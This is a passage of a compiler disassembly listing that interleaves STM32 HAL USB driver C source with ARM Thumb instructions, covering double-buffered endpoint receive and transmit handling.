 80030ec:	009b      	lsls	r3, r3, #2
 80030ee:	441a      	add	r2, r3
 80030f0:	8bfb      	ldrh	r3, [r7, #30]
 80030f2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030f6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030fa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80030fe:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003102:	b29b      	uxth	r3, r3
 8003104:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8003106:	88fb      	ldrh	r3, [r7, #6]
 8003108:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800310c:	2b00      	cmp	r3, #0
 800310e:	d11f      	bne.n	8003150 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8003110:	68fb      	ldr	r3, [r7, #12]
 8003112:	681b      	ldr	r3, [r3, #0]
 8003114:	461a      	mov	r2, r3
 8003116:	68bb      	ldr	r3, [r7, #8]
 8003118:	781b      	ldrb	r3, [r3, #0]
 800311a:	009b      	lsls	r3, r3, #2
 800311c:	4413      	add	r3, r2
 800311e:	881b      	ldrh	r3, [r3, #0]
 8003120:	b29b      	uxth	r3, r3
 8003122:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003126:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800312a:	83bb      	strh	r3, [r7, #28]
 800312c:	68fb      	ldr	r3, [r7, #12]
 800312e:	681b      	ldr	r3, [r3, #0]
 8003130:	461a      	mov	r2, r3
 8003132:	68bb      	ldr	r3, [r7, #8]
 8003134:	781b      	ldrb	r3, [r3, #0]
 8003136:	009b      	lsls	r3, r3, #2
 8003138:	441a      	add	r2, r3
 800313a:	8bbb      	ldrh	r3, [r7, #28]
 800313c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003140:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003144:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003148:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800314c:	b29b      	uxth	r3, r3
 800314e:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8003150:	8b7b      	ldrh	r3, [r7, #26]
 8003152:	2b00      	cmp	r3, #0
 8003154:	d008      	beq.n	8003168 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8003156:	68fb      	ldr	r3, [r7, #12]
 8003158:	6818      	ldr	r0, [r3, #0]
 800315a:	68bb      	ldr	r3, [r7, #8]
 800315c:	6959      	ldr	r1, [r3, #20]
 800315e:	68bb      	ldr	r3, [r7, #8]
 8003160:	895a      	ldrh	r2, [r3, #10]
 8003162:	8b7b      	ldrh	r3, [r7, #26]
 8003164:	f005 faf7 	bl	8008756 <USB_ReadPMA>
    }
  }

  return count;
 8003168:	8b7b      	ldrh	r3, [r7, #26]
}
 800316a:	4618      	mov	r0, r3
 800316c:	3720      	adds	r7, #32
 800316e:	46bd      	mov	sp, r7
 8003170:	bd80      	pop	{r7, pc}

08003172 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8003172:	b580      	push	{r7, lr}
 8003174:	b0a4      	sub	sp, #144	; 0x90
 8003176:	af00      	add	r7, sp, #0
 8003178:	60f8      	str	r0, [r7, #12]
 800317a:	60b9      	str	r1, [r7, #8]
 800317c:	4613      	mov	r3, r2
 800317e:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8003180:	88fb      	ldrh	r3, [r7, #6]
 8003182:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8003186:	2b00      	cmp	r3, #0
 8003188:	f000 81db 	beq.w	8003542 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 800318c:	68fb      	ldr	r3, [r7, #12]
 800318e:	681b      	ldr	r3, [r3, #0]
 8003190:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003194:	b29b      	uxth	r3, r3
 8003196:	461a      	mov	r2, r3
 8003198:	68bb      	ldr	r3, [r7, #8]
 800319a:	781b      	ldrb	r3, [r3, #0]
 800319c:	00db      	lsls	r3, r3, #3
 800319e:	4413      	add	r3, r2
 80031a0:	68fa      	ldr	r2, [r7, #12]
 80031a2:	6812      	ldr	r2, [r2, #0]
 80031a4:	4413      	add	r3, r2
 80031a6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031aa:	881b      	ldrh	r3, [r3, #0]
 80031ac:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031b0:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 80031b4:	68bb      	ldr	r3, [r7, #8]
 80031b6:	699a      	ldr	r2, [r3, #24]
 80031b8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80031bc:	429a      	cmp	r2, r3
 80031be:	d907      	bls.n	80031d0 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 80031c0:	68bb      	ldr	r3, [r7, #8]
 80031c2:	699a      	ldr	r2, [r3, #24]
 80031c4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80031c8:	1ad2      	subs	r2, r2, r3
 80031ca:	68bb      	ldr	r3, [r7, #8]
 80031cc:	619a      	str	r2, [r3, #24]
 80031ce:	e002      	b.n	80031d6 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 80031d0:	68bb      	ldr	r3, [r7, #8]
 80031d2:	2200      	movs	r2, #0
 80031d4:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80031d6:	68bb      	ldr	r3, [r7, #8]
 80031d8:	699b      	ldr	r3, [r3, #24]
 80031da:	2b00      	cmp	r3, #0
 80031dc:	f040 80b9 	bne.w	8003352 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80031e0:	68bb      	ldr	r3, [r7, #8]
 80031e2:	785b      	ldrb	r3, [r3, #1]
 80031e4:	2b00      	cmp	r3, #0
 80031e6:	d126      	bne.n	8003236 <HAL_PCD_EP_DB_Transmit+0xc4>
 80031e8:	68fb      	ldr	r3, [r7, #12]
 80031ea:	681b      	ldr	r3, [r3, #0]
 80031ec:	62fb      	str	r3, [r7, #44]	; 0x2c
 80031ee:	68fb      	ldr	r3, [r7, #12]
 80031f0:	681b      	ldr	r3, [r3, #0]
 80031f2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031f6:	b29b      	uxth	r3, r3
 80031f8:	461a      	mov	r2, r3
 80031fa:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80031fc:	4413      	add	r3, r2
 80031fe:	62fb      	str	r3, [r7, #44]	; 0x2c
 8003200:	68bb      	ldr	r3, [r7, #8]
 8003202:	781b      	ldrb	r3, [r3, #0]
 8003204:	00da      	lsls	r2, r3, #3
 8003206:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8003208:	4413      	add	r3, r2
 800320a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800320e:	62bb      	str	r3, [r7, #40]	; 0x28
 8003210:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003212:	881b      	ldrh	r3, [r3, #0]
 8003214:	b29b      	uxth	r3, r3
 8003216:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800321a:	b29a      	uxth	r2, r3
 800321c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800321e:	801a      	strh	r2, [r3, #0]
 8003220:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003222:	881b      	ldrh	r3, [r3, #0]
 8003224:	b29b      	uxth	r3, r3
 8003226:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800322a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800322e:	b29a      	uxth	r2, r3
 8003230:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003232:	801a      	strh	r2, [r3, #0]
 8003234:	e01a      	b.n	800326c <HAL_PCD_EP_DB_Transmit+0xfa>
 8003236:	68bb      	ldr	r3, [r7, #8]
 8003238:	785b      	ldrb	r3, [r3, #1]
 800323a:	2b01      	cmp	r3, #1
 800323c:	d116      	bne.n	800326c <HAL_PCD_EP_DB_Transmit+0xfa>
 800323e:	68fb      	ldr	r3, [r7, #12]
 8003240:	681b      	ldr	r3, [r3, #0]
 8003242:	637b      	str	r3, [r7, #52]	; 0x34
 8003244:	68fb      	ldr	r3, [r7, #12]
 8003246:	681b      	ldr	r3, [r3, #0]
 8003248:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800324c:	b29b      	uxth	r3, r3
 800324e:	461a      	mov	r2, r3
 8003250:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8003252:	4413      	add	r3, r2
 8003254:	637b      	str	r3, [r7, #52]	; 0x34
 8003256:	68bb      	ldr	r3, [r7, #8]
 8003258:	781b      	ldrb	r3, [r3, #0]
 800325a:	00da      	lsls	r2, r3, #3
 800325c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800325e:	4413      	add	r3, r2
 8003260:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003264:	633b      	str	r3, [r7, #48]	; 0x30
 8003266:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8003268:	2200      	movs	r2, #0
 800326a:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 800326c:	68fb      	ldr	r3, [r7, #12]
 800326e:	681b      	ldr	r3, [r3, #0]
 8003270:	627b      	str	r3, [r7, #36]	; 0x24
 8003272:	68bb      	ldr	r3, [r7, #8]
 8003274:	785b      	ldrb	r3, [r3, #1]
 8003276:	2b00      	cmp	r3, #0
 8003278:	d126      	bne.n	80032c8 <HAL_PCD_EP_DB_Transmit+0x156>
 800327a:	68fb      	ldr	r3, [r7, #12]
 800327c:	681b      	ldr	r3, [r3, #0]
 800327e:	61fb      	str	r3, [r7, #28]
 8003280:	68fb      	ldr	r3, [r7, #12]
 8003282:	681b      	ldr	r3, [r3, #0]
 8003284:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003288:	b29b      	uxth	r3, r3
 800328a:	461a      	mov	r2, r3
 800328c:	69fb      	ldr	r3, [r7, #28]
 800328e:	4413      	add	r3, r2
 8003290:	61fb      	str	r3, [r7, #28]
 8003292:	68bb      	ldr	r3, [r7, #8]
 8003294:	781b      	ldrb	r3, [r3, #0]
 8003296:	00da      	lsls	r2, r3, #3
 8003298:	69fb      	ldr	r3, [r7, #28]
 800329a:	4413      	add	r3, r2
 800329c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032a0:	61bb      	str	r3, [r7, #24]
 80032a2:	69bb      	ldr	r3, [r7, #24]
 80032a4:	881b      	ldrh	r3, [r3, #0]
 80032a6:	b29b      	uxth	r3, r3
 80032a8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80032ac:	b29a      	uxth	r2, r3
 80032ae:	69bb      	ldr	r3, [r7, #24]
 80032b0:	801a      	strh	r2, [r3, #0]
 80032b2:	69bb      	ldr	r3, [r7, #24]
 80032b4:	881b      	ldrh	r3, [r3, #0]
 80032b6:	b29b      	uxth	r3, r3
 80032b8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80032bc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80032c0:	b29a      	uxth	r2, r3
 80032c2:	69bb      	ldr	r3, [r7, #24]
 80032c4:	801a      	strh	r2, [r3, #0]
 80032c6:	e017      	b.n	80032f8 <HAL_PCD_EP_DB_Transmit+0x186>
 80032c8:	68bb      	ldr	r3, [r7, #8]
 80032ca:	785b      	ldrb	r3, [r3, #1]
 80032cc:	2b01      	cmp	r3, #1
 80032ce:	d113      	bne.n	80032f8 <HAL_PCD_EP_DB_Transmit+0x186>
 80032d0:	68fb      	ldr	r3, [r7, #12]
 80032d2:	681b      	ldr	r3, [r3, #0]
 80032d4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032d8:	b29b      	uxth	r3, r3
 80032da:	461a      	mov	r2, r3
 80032dc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80032de:	4413      	add	r3, r2
 80032e0:	627b      	str	r3, [r7, #36]	; 0x24
 80032e2:	68bb      	ldr	r3, [r7, #8]
 80032e4:	781b      	ldrb	r3, [r3, #0]
 80032e6:	00da      	lsls	r2, r3, #3
 80032e8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80032ea:	4413      	add	r3, r2
 80032ec:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032f0:	623b      	str	r3, [r7, #32]
 80032f2:	6a3b      	ldr	r3, [r7, #32]
 80032f4:	2200      	movs	r2, #0
 80032f6:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80032f8:	68bb      	ldr	r3, [r7, #8]
 80032fa:	781b      	ldrb	r3, [r3, #0]
 80032fc:	4619      	mov	r1, r3
 80032fe:	68f8      	ldr	r0, [r7, #12]
 8003300:	f009 fc49 	bl	800cb96 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003304:	88fb      	ldrh	r3, [r7, #6]
 8003306:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800330a:	2b00      	cmp	r3, #0
 800330c:	f000 82fa 	beq.w	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003310:	68fb      	ldr	r3, [r7, #12]
 8003312:	681b      	ldr	r3, [r3, #0]
 8003314:	461a      	mov	r2, r3
 8003316:	68bb      	ldr	r3, [r7, #8]
 8003318:	781b      	ldrb	r3, [r3, #0]
 800331a:	009b      	lsls	r3, r3, #2
 800331c:	4413      	add	r3, r2
 800331e:	881b      	ldrh	r3, [r3, #0]
 8003320:	b29b      	uxth	r3, r3
 8003322:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003326:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800332a:	82fb      	strh	r3, [r7, #22]
 800332c:	68fb      	ldr	r3, [r7, #12]
 800332e:	681b      	ldr	r3, [r3, #0]
 8003330:	461a      	mov	r2, r3
 8003332:	68bb      	ldr	r3, [r7, #8]
 8003334:	781b      	ldrb	r3, [r3, #0]
 8003336:	009b      	lsls	r3, r3, #2
 8003338:	441a      	add	r2, r3
 800333a:	8afb      	ldrh	r3, [r7, #22]
 800333c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003340:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003344:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003348:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800334c:	b29b      	uxth	r3, r3
 800334e:	8013      	strh	r3, [r2, #0]
 8003350:	e2d8      	b.n	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003352:	88fb      	ldrh	r3, [r7, #6]
 8003354:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003358:	2b00      	cmp	r3, #0
 800335a:	d021      	beq.n	80033a0 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800335c:	68fb      	ldr	r3, [r7, #12]
 800335e:	681b      	ldr	r3, [r3, #0]
 8003360:	461a      	mov	r2, r3
 8003362:	68bb      	ldr	r3, [r7, #8]
 8003364:	781b      	ldrb	r3, [r3, #0]
 8003366:	009b      	lsls	r3, r3, #2
 8003368:	4413      	add	r3, r2
 800336a:	881b      	ldrh	r3, [r3, #0]
 800336c:	b29b      	uxth	r3, r3
 800336e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003372:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003376:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800337a:	68fb      	ldr	r3, [r7, #12]
 800337c:	681b      	ldr	r3, [r3, #0]
 800337e:	461a      	mov	r2, r3
 8003380:	68bb      	ldr	r3, [r7, #8]
 8003382:	781b      	ldrb	r3, [r3, #0]
 8003384:	009b      	lsls	r3, r3, #2
 8003386:	441a      	add	r2, r3
 8003388:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800338c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003390:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003394:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003398:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800339c:	b29b      	uxth	r3, r3
 800339e:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80033a0:	68bb      	ldr	r3, [r7, #8]
 80033a2:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80033a6:	2b01      	cmp	r3, #1
 80033a8:	f040 82ac 	bne.w	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80033ac:	68bb      	ldr	r3, [r7, #8]
 80033ae:	695a      	ldr	r2, [r3, #20]
 80033b0:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80033b4:	441a      	add	r2, r3
 80033b6:	68bb      	ldr	r3, [r7, #8]
 80033b8:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80033ba:	68bb      	ldr	r3, [r7, #8]
 80033bc:	69da      	ldr	r2, [r3, #28]
 80033be:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80033c2:	441a      	add	r2, r3
 80033c4:	68bb      	ldr	r3, [r7, #8]
 80033c6:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80033c8:	68bb      	ldr	r3, [r7, #8]
 80033ca:	6a1a      	ldr	r2, [r3, #32]
 80033cc:	68bb      	ldr	r3, [r7, #8]
 80033ce:	691b      	ldr	r3, [r3, #16]
 80033d0:	429a      	cmp	r2, r3
 80033d2:	d30b      	bcc.n	80033ec <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 80033d4:	68bb      	ldr	r3, [r7, #8]
 80033d6:	691b      	ldr	r3, [r3, #16]
 80033d8:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80033dc:	68bb      	ldr	r3, [r7, #8]
 80033de:	6a1a      	ldr	r2, [r3, #32]
 80033e0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033e4:	1ad2      	subs	r2, r2, r3
 80033e6:	68bb      	ldr	r3, [r7, #8]
 80033e8:	621a      	str	r2, [r3, #32]
 80033ea:	e017      	b.n	800341c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 80033ec:	68bb      	ldr	r3, [r7, #8]
 80033ee:	6a1b      	ldr	r3, [r3, #32]
 80033f0:	2b00      	cmp	r3, #0
 80033f2:	d108      	bne.n	8003406 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 80033f4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80033f8:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80033fc:	68bb      	ldr	r3, [r7, #8]
 80033fe:	2200      	movs	r2, #0
 8003400:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003404:	e00a      	b.n	800341c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 8003406:	68bb      	ldr	r3, [r7, #8]
 8003408:	2200      	movs	r2, #0
 800340a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 800340e:	68bb      	ldr	r3, [r7, #8]
 8003410:	6a1b      	ldr	r3, [r3, #32]
 8003412:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003416:	68bb      	ldr	r3, [r7, #8]
 8003418:	2200      	movs	r2, #0
 800341a:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 800341c:	68bb      	ldr	r3, [r7, #8]
 800341e:	785b      	ldrb	r3, [r3, #1]
 8003420:	2b00      	cmp	r3, #0
 8003422:	d165      	bne.n	80034f0 <HAL_PCD_EP_DB_Transmit+0x37e>
 8003424:	68fb      	ldr	r3, [r7, #12]
 8003426:	681b      	ldr	r3, [r3, #0]
 8003428:	63fb      	str	r3, [r7, #60]	; 0x3c
 800342a:	68fb      	ldr	r3, [r7, #12]
 800342c:	681b      	ldr	r3, [r3, #0]
 800342e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003432:	b29b      	uxth	r3, r3
 8003434:	461a      	mov	r2, r3
 8003436:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003438:	4413      	add	r3, r2
 800343a:	63fb      	str	r3, [r7, #60]	; 0x3c
 800343c:	68bb      	ldr	r3, [r7, #8]
 800343e:	781b      	ldrb	r3, [r3, #0]
 8003440:	00da      	lsls	r2, r3, #3
 8003442:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003444:	4413      	add	r3, r2
 8003446:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800344a:	63bb      	str	r3, [r7, #56]	; 0x38
 800344c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800344e:	881b      	ldrh	r3, [r3, #0]
 8003450:	b29b      	uxth	r3, r3
 8003452:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003456:	b29a      	uxth	r2, r3
 8003458:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800345a:	801a      	strh	r2, [r3, #0]
 800345c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003460:	2b3e      	cmp	r3, #62	; 0x3e
 8003462:	d91d      	bls.n	80034a0 <HAL_PCD_EP_DB_Transmit+0x32e>
 8003464:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003468:	095b      	lsrs	r3, r3, #5
 800346a:	64bb      	str	r3, [r7, #72]	; 0x48
 800346c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003470:	f003 031f 	and.w	r3, r3, #31
 8003474:	2b00      	cmp	r3, #0
 8003476:	d102      	bne.n	800347e <HAL_PCD_EP_DB_Transmit+0x30c>
 8003478:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800347a:	3b01      	subs	r3, #1
 800347c:	64bb      	str	r3, [r7, #72]	; 0x48
 800347e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003480:	881b      	ldrh	r3, [r3, #0]
 8003482:	b29a      	uxth	r2, r3
 8003484:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003486:	b29b      	uxth	r3, r3
 8003488:	029b      	lsls	r3, r3, #10
 800348a:	b29b      	uxth	r3, r3
 800348c:	4313      	orrs	r3, r2
 800348e:	b29b      	uxth	r3, r3
 8003490:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003494:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003498:	b29a      	uxth	r2, r3
 800349a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800349c:	801a      	strh	r2, [r3, #0]
 800349e:	e044      	b.n	800352a <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034a0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034a4:	2b00      	cmp	r3, #0
 80034a6:	d10a      	bne.n	80034be <HAL_PCD_EP_DB_Transmit+0x34c>
 80034a8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80034aa:	881b      	ldrh	r3, [r3, #0]
 80034ac:	b29b      	uxth	r3, r3
 80034ae:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80034b2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80034b6:	b29a      	uxth	r2, r3
 80034b8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80034ba:	801a      	strh	r2, [r3, #0]
 80034bc:	e035      	b.n	800352a <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034be:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034c2:	085b      	lsrs	r3, r3, #1
 80034c4:	64bb      	str	r3, [r7, #72]	; 0x48
 80034c6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034ca:	f003 0301 	and.w	r3, r3, #1
 80034ce:	2b00      	cmp	r3, #0
 80034d0:	d002      	beq.n	80034d8 <HAL_PCD_EP_DB_Transmit+0x366>
 80034d2:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80034d4:	3301      	adds	r3, #1
 80034d6:	64bb      	str	r3, [r7, #72]	; 0x48
 80034d8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80034da:	881b      	ldrh	r3, [r3, #0]
 80034dc:	b29a      	uxth	r2, r3
 80034de:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80034e0:	b29b      	uxth	r3, r3
 80034e2:	029b      	lsls	r3, r3, #10
 80034e4:	b29b      	uxth	r3, r3
 80034e6:	4313      	orrs	r3, r2
 80034e8:	b29a      	uxth	r2, r3
 80034ea:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80034ec:	801a      	strh	r2, [r3, #0]
 80034ee:	e01c      	b.n	800352a <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034f0:	68bb      	ldr	r3, [r7, #8]
 80034f2:	785b      	ldrb	r3, [r3, #1]
 80034f4:	2b01      	cmp	r3, #1
 80034f6:	d118      	bne.n	800352a <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034f8:	68fb      	ldr	r3, [r7, #12]
 80034fa:	681b      	ldr	r3, [r3, #0]
 80034fc:	647b      	str	r3, [r7, #68]	; 0x44
 80034fe:	68fb      	ldr	r3, [r7, #12]
 8003500:	681b      	ldr	r3, [r3, #0]
 8003502:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003506:	b29b      	uxth	r3, r3
 8003508:	461a      	mov	r2, r3
 800350a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800350c:	4413      	add	r3, r2
 800350e:	647b      	str	r3, [r7, #68]	; 0x44
 8003510:	68bb      	ldr	r3, [r7, #8]
 8003512:	781b      	ldrb	r3, [r3, #0]
 8003514:	00da      	lsls	r2, r3, #3
 8003516:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003518:	4413      	add	r3, r2
 800351a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800351e:	643b      	str	r3, [r7, #64]	; 0x40
 8003520:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003524:	b29a      	uxth	r2, r3
 8003526:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8003528:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 800352a:	68fb      	ldr	r3, [r7, #12]
 800352c:	6818      	ldr	r0, [r3, #0]
 800352e:	68bb      	ldr	r3, [r7, #8]
 8003530:	6959      	ldr	r1, [r3, #20]
 8003532:	68bb      	ldr	r3, [r7, #8]
 8003534:	891a      	ldrh	r2, [r3, #8]
 8003536:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800353a:	b29b      	uxth	r3, r3
 800353c:	f005 f8c9 	bl	80086d2 <USB_WritePMA>
 8003540:	e1e0      	b.n	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003542:	68fb      	ldr	r3, [r7, #12]
 8003544:	681b      	ldr	r3, [r3, #0]
 8003546:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800354a:	b29b      	uxth	r3, r3
 800354c:	461a      	mov	r2, r3
 800354e:	68bb      	ldr	r3, [r7, #8]
 8003550:	781b      	ldrb	r3, [r3, #0]
 8003552:	00db      	lsls	r3, r3, #3
 8003554:	4413      	add	r3, r2
 8003556:	68fa      	ldr	r2, [r7, #12]
 8003558:	6812      	ldr	r2, [r2, #0]
